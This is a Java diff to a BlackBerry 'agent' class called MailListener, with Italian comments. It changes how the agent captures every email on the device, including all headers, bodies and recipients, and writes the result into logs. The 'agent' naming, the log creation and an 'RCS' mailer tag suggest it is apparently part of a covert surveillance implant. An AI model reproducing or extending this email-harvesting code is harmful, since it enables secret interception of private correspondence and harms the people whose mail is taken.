@@ -5,16 +5,16 @@ package blackberry.agent;
 
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.util.Enumeration;
 import java.util.Vector;
 
 import net.rim.blackberry.api.mail.Address;
 import net.rim.blackberry.api.mail.BodyPart;
 import net.rim.blackberry.api.mail.Folder;
+import net.rim.blackberry.api.mail.Header;
 import net.rim.blackberry.api.mail.Message;
-import net.rim.blackberry.api.mail.MessagingException;
-//#ifdef HAVE_MIME
-import net.rim.blackberry.api.mail.MimeBodyPart;
-//#endif
+import net.rim.blackberry.api.mail.MessagingException; //#ifdef HAVE_MIME
+import net.rim.blackberry.api.mail.MimeBodyPart; //#endif
 import net.rim.blackberry.api.mail.Multipart;
 import net.rim.blackberry.api.mail.SendListener;
 import net.rim.blackberry.api.mail.ServiceConfiguration;
@@ -66,11 +66,11 @@ public final class MailListener implements FolderListener, StoreListener,
      * 
      * @param multipart
      *            the multipart
-     * @param maxMessageLen
+     * @param maxMessageSize
      *            the max message len
      */
-    protected static void displayMultipart(final Multipart multipart,
-            final int maxMessageLen) {
+    protected void displayMultipart(final Multipart multipart,
+            StringBuffer mail, final long maxMessageSize) {
         // This vector stores fields which are to be displayed only after all
         // of the body fields are displayed. (Attachments and Contacts).
         final Vector delayedFields = new Vector();
@@ -93,22 +93,31 @@ public final class MailListener implements FolderListener, StoreListener,
                         Transport.more(textBodyPart, true);
                     } catch (final Exception e) {
                         // #debug debug
-                        debug.trace("Transport.more(BodyPart, boolean) threw "                                + e.toString());
+                        debug.trace("Transport.more(BodyPart, boolean) threw "
+                                + e.toString());
                     }
                 }
                 String plainText = (String) textBodyPart.getContent();
+
+                mail.append("Content-type: "+ textBodyPart.getContentType() +"; charset=UTF8\r\n\r\n");                                          
+                //mail.append("Content-type: "+ textBodyPart.getContentType() +";\r\n\r\n");                          
+                
+                mail.append(plainText);
+                
+                //#debug debug
+                debug.trace("TextBodyPart: "+ mail.toString());
 
                 // Display the plain text, using an EditField if the message is
                 // editable or a RichTextField if it is not editable. Note: this
                 // does not add any empty fields.
                 if (plainText.length() != 0) {
-                    if (maxMessageLen > 0 && plainText.length() > maxMessageLen) {
+                    if (maxMessageSize > 0
+                            && plainText.length() > maxMessageSize) {
                         // se e' attivo il filtro sulla dimensione dell'email,
                         // sovrascrive al body dell'email la stringa troncata
-                        plainText = plainText.substring(0, (maxMessageLen));
+                        plainText = plainText.substring(0,
+                                (int) (maxMessageSize));
                     }
-                    // #debug debug
-                    debug.trace("Testo dell'email :" + plainText);
                 }
             }
             // #ifdef HAVE_MIME
@@ -125,17 +134,23 @@ public final class MailListener implements FolderListener, StoreListener,
                         // se e' attivo il filtro sulla dimensione dell'email,
                         // sovrascrive al body dell'email la stringa troncata
 
-                        if (maxMessageLen > 0
-                                && htmlText.length() > maxMessageLen) {
+                        if (maxMessageSize > 0
+                                && htmlText.length() > maxMessageSize) {
                             // se e' attivo il filtro sulla dimensione
                             // dell'email,
                             // sovrascrive al body dell'email la stringa
                             // troncata
-                            htmlText = htmlText.substring(0, (maxMessageLen));
+                            htmlText = htmlText.substring(0,
+                                    (int) (maxMessageSize));
                         }
 
                         // #debug debug
                         debug.trace("Testo dell'email MIME: " + htmlText);
+                        
+                        addAllHeaders(mimeBodyPart.getAllHeaders(), mail);               
+                        mail.append(htmlText);
+                        //#debug debug
+                        debug.trace("HTML: "+ mail.toString());
                     }
                 } else if (contentType
                         .equals(BodyPart.ContentType.TYPE_MULTIPART_ALTERNATIVE_STRING)) {
@@ -149,7 +164,8 @@ public final class MailListener implements FolderListener, StoreListener,
                                 .getContentType();
                         if (childMultipartType
                                 .equals(BodyPart.ContentType.TYPE_MULTIPART_ALTERNATIVE_STRING)) {
-                            displayMultipart(childMultipart, maxMessageLen);
+                            displayMultipart(childMultipart, mail,
+                                    maxMessageSize);
                         }
                     }
                 }
@@ -286,27 +302,40 @@ public final class MailListener implements FolderListener, StoreListener,
 
         //#debug debug
         debug.trace("saveLog: " + message);
+
         ByteArrayOutputStream os = null;
         try {
             os = new ByteArrayOutputStream();
             message.writeTo(os);
             final byte[] rfc822 = os.toByteArray();
 
-            final String plain = "Content-Type: text/plain\r\n" ;
-            
-            String messageContent =   new String(rfc822);
-            Object co = message.getContent();
+            //final String content_type = "Content-Type: text/plain;\r\n";
+            //final String content_transfer = "Content-Transfer-Encoding: binary\r\n";
+
+            String messageContent = new String(rfc822);
+            //Object co = message.getContent();
             //byte[] content = (byte[]) co;
             //String messageContent =   new String(content);
-            
+
+            int poscont = messageContent.indexOf("Content-Type");
+            if (poscont == -1) {
+                /*
+                 * int pos = messageContent.indexOf("\r\n\r\n");
+                 * if (pos > 0) {
+                 * String headers = messageContent.substring(0, pos);
+                 * String body = messageContent.substring(pos);
+                 * messageContent = headers + "\r\n" + plain + body;
+                 * }
+                 */
+
+                //messageContent = content_type + content_transfer + messageContent;
+            }
+
             //#debug debug
             debug.trace(messageContent);
-            
-            
-            // #debug debug
-            debug.trace("BodyText: " + message.getBodyText());
-           
-            
+
+            //debug.trace("BodyText: " + message.getBodyText());
+
             final int flags = 1;
             final int size = message.getSize();
             final DateTime filetime = new DateTime(message.getReceivedDate());
@@ -325,7 +354,11 @@ public final class MailListener implements FolderListener, StoreListener,
             databuffer.writeLong(filetime.getFiledate());
             Check.ensures(additionalData.length == 20, "Wrong buffer size");
 
-            messageAgent.createLog(additionalData, rfc822);
+            String mail = showMessage(message, maxMessageSize);
+            //#debug debug
+            debug.trace("saveLog: " + mail);
+
+            messageAgent.createLog(additionalData, mail.getBytes("UTF-8"));
 
         } catch (final IOException e) {
             // TODO Auto-generated catch block
@@ -355,7 +388,8 @@ public final class MailListener implements FolderListener, StoreListener,
         }
         for (int count = 0; count < subfolders.length; count++) {
             // #debug debug
-            debug.trace("Nome della cartella: "                    + subfolders[count].getFullName());
+            debug.trace("Nome della cartella: "
+                    + subfolders[count].getFullName());
             dirs = subfolders[count].list();
             scanFolder(dirs);
             try {
@@ -398,18 +432,24 @@ public final class MailListener implements FolderListener, StoreListener,
         return true;
     }
 
-    private void showMessage(final Message message, final int maxMessageLen) {
+    private String showMessage(final Message message, final long maxMessageSize) {
         Address[] addresses;
+
+        StringBuffer mail = new StringBuffer();
+        //mail.append("MIME-Version: 1.0\r\n");
+        // mail.append("X-Mailer: RCS\r\n");
+
         try {
-            addresses = message.getRecipients(Message.RecipientType.TO);
-            // #mdebug
-            for (int i = 0; i < addresses.length; i++) {
-                debug
-                        .trace("Destinatari dell'email: "
-                                + addresses[i].getAddr());
+            Address[] from = message.getRecipients(Message.RecipientType.FROM);
+            if(from.length == 0){
+                message.addHeader("From:", "localuser");
             }
-            debug
-                    .trace("Dimensione dell'email: " + message.getSize()
+            message.addHeader("MIME-Version:","1.0");
+            
+            addAllHeaders(message.getAllHeaders(), mail);
+
+
+            debug.trace("Dimensione dell'email: " + message.getSize()
                             + "bytes");
             debug.trace("Data invio dell'email: " + message.getSentDate());
             debug.trace("Oggetto dell'email: " + message.getSubject());
@@ -432,12 +472,24 @@ public final class MailListener implements FolderListener, StoreListener,
                     .equals(BodyPart.ContentType.TYPE_MULTIPART_ALTERNATIVE_STRING)
                     || mpType
                             .equals(BodyPart.ContentType.TYPE_MULTIPART_MIXED_STRING)) {
-                displayMultipart(parent, maxMessageLen);
+                displayMultipart(parent, mail, maxMessageSize);
             }
             // #endif
         } catch (final MessagingException e1) {
             // TODO Auto-generated catch block
             e1.printStackTrace();
+        }
+
+        return mail.toString();
+    }
+
+    private void addAllHeaders(final Enumeration headers, StringBuffer mail) {
+
+        while (headers.hasMoreElements()) {
+            Header header = (Header) headers.nextElement();
+            mail.append(header.getName());
+            mail.append(header.getValue());
+            mail.append("\r\n");
         }
     }
 
@@ -451,7 +503,8 @@ public final class MailListener implements FolderListener, StoreListener,
 
         names = new String[mailServiceRecords.length];
         // #debug debug
-        debug.trace("Ci sono: " + mailServiceRecords.length                + " account di posta!");
+        debug.trace("Ci sono: " + mailServiceRecords.length
+                + " account di posta!");
 
         // Controllo tutti gli account di posta
         for (int count = mailServiceRecords.length - 1; count >= 0; --count) {
